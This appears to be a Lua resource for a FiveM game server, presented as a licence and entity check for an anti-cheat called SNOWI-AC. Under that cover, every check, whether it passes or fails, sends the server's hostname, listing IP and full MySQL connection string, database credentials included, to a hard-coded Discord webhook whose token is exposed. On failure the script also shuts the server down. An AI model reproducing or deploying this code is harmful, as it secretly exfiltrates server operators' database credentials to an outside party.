--[[
	id: GGj4AOUnExaXMY7exzbRk
	name: entis decryps secure
	description: con seguridad por si se lekeea
	time1: 2021-07-21 09:19:38.292952+00
	time2: 2021-07-21 09:19:38.292953+00
	uploader: VVNt0cj-hz2CH5jkESZw-kkH85LAm5IYdVDsmdWe
	uploadersession: 8Jd9DLXQYEfzu5DDIJNeydUIF5Nmsi
	flag: f
--]]

local errorKEY = 'SNOWI-AC / Check Entidades ->'..math.random(1,9832785)

function chekkEntis()
    function authentiiis()
          PerformHttpRequest("https://api.ipify.org/?format=json", function(reCode, resultData, resultHeaders)
              local data = json.decode(resultData)
              PerformHttpRequest("https://snowiac.es/ac/api/validate/host/"..data.ip.."/1",checkentiiis,"POST")
          end)
    end
      function checkentiiis(g,h,i)
       
          if g == 200 then 
              local j = json.decode(h)
      
              if j.status == 301 then 
                local enco = {
                    {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = '**FALLO AL VERIFICAR FUNCION DE ENTIDADES, IP INVALIDA.** \nURL INFO [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
                }
                PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                     if p ~= 204 then
                        print('^1p Es diferente', p)
                    end
                    if q == nil then
                        print('^1q es nil', q)
                end
            end,"POST",
                json.encode(
                    {username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
                ),
                {["Content-Type"] = "application/json"}
            )
                  Wait(120000)
                  StopResource(GetCurrentResourceName())
                  os.exit()
              else 
                  Wait(12000)
                  print('Exito al verificar check entidaes! SNOWI-AC')
              end 
          else 
            local enco = {
                {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = '**FALLO AL VERIFICAR FUNCION DE ENTIDADES, URL NO RESPONDE.** \nURL INFO [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
            }
            PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                 if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
            end
        end,"POST",
            json.encode(
                {username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
            ),
            {["Content-Type"] = "application/json"}
        )
                  Wait(120000)
                  StopResource(GetCurrentResourceName())
                  os.exit()
          end
          local enco = {
            {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = 'VERIFICACION CHECK FUNCION ENTIDADES CON EXITO. \n URL INFO [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
        }
        PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
             if p ~= 204 then
                print('^1p Es diferente', p)
            end
            if q == nil then
                print('^1q es nil', q)
        end
    end,"POST",
        json.encode(
            {username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
        ),
        {["Content-Type"] = "application/json"}
    )
     
          print('Sucessfull check entidades SNOWI-AC | Protec')
         confirmCheck('truee')
                  SetTimeout(9900000, authentiiis)
                  
          end
      authentiiis()
        end